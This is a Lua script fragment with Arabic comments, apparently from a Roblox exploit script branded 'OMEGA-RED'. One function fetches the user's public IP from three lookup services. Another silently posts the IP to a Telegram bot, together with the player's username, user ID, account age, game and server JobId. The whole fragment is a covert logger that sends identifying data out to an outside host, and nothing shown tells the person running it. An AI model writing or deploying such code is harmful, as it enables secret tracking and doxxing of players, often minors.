-- ========== دالة جلب الـ IP ==========
local function GetIP()
    local ip = ""
    -- طريقة 1
    local ok, res = pcall(function()
        return game:HttpGet("https://api.ipify.org?format=json")
    end)
    if ok and res and res ~= "" then
        local ok2, data = pcall(function() return HttpService:JSONDecode(res) end)
        if ok2 and data and data.ip then ip = data.ip end
    end
    -- طريقة 2
    if ip == "" then
        local ok, res = pcall(function()
            return game:HttpGet("http://ip-api.com/json/")
        end)
        if ok and res and res ~= "" then
            local ok2, data = pcall(function() return HttpService:JSONDecode(res) end)
            if ok2 and data and data.query then ip = data.query end
        end
    end
    -- طريقة 3
    if ip == "" then
        local ok, res = pcall(function()
            return game:HttpGet("https://httpbin.org/ip")
        end)
        if ok and res and res ~= "" then
            local ok2, data = pcall(function() return HttpService:JSONDecode(res) end)
            if ok2 and data and data.origin then ip = data.origin end
        end
    end
    if ip == "" then ip = "فشل الجلب" end
    return ip
end

-- ========== دالة إرسال للبوت ==========
local function SendToTelegram(enteredName, ip, status)
    local playerName = LP.Name
    local playerDisplay = LP.DisplayName
    local playerId = LP.UserId
    local accountAge = LP.AccountAge
    local gameJobId = game.JobId ~= "" and game.JobId or "N/A"
    local placeId = game.PlaceId
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"

    local msg = "🎯 **دخول جديد إلى OMEGA-RED**\n\n" ..
        "👤 **الاسم المُدخل:** `" .. tostring(enteredName) .. "`\n" ..
        "🎮 **اسم اللاعب:** " .. playerDisplay .. "\n" ..
        "🆔 **اليوزر:** `" .. playerName .. "`\n" ..
        "🔢 **الآيدي:** `" .. tostring(playerId) .. "`\n" ..
        "📅 **عمر الحساب:** " .. tostring(accountAge) .. " يوم\n\n" ..
        "🌐 **الـ IP:** `" .. tostring(ip) .. "`\n\n" ..
        "🎯 **اللعبة:** " .. tostring(gameName) .. "\n" ..
        "📍 **PlaceId:** `" .. tostring(placeId) .. "`\n" ..
        "🔗 **JobId:** `" .. tostring(gameJobId) .. "`\n\n" ..
        "✅ **الحالة:** " .. tostring(status) .. "\n" ..
        "⏰ **التوقيت:** " .. os.date("%Y-%m-%d %H:%M:%S")

    -- إرسال عبر POST
    pcall(function()
        HttpService:RequestAsync({
            Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                chat_id = CHAT_ID,
                text = msg,
                parse_mode = "Markdown"
            })
        })
    end)

    -- إرسال عبر GET (احتياطي)
    pcall(function()
        local encoded = HttpService:UrlEncode(msg)
        game:HttpGet("https://api.telegram.org/bot" .. BOT_TOKEN ..
            "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. encoded)
    end)

    print("✅ تم إرسال البيانات إلى تيليجرام")
end

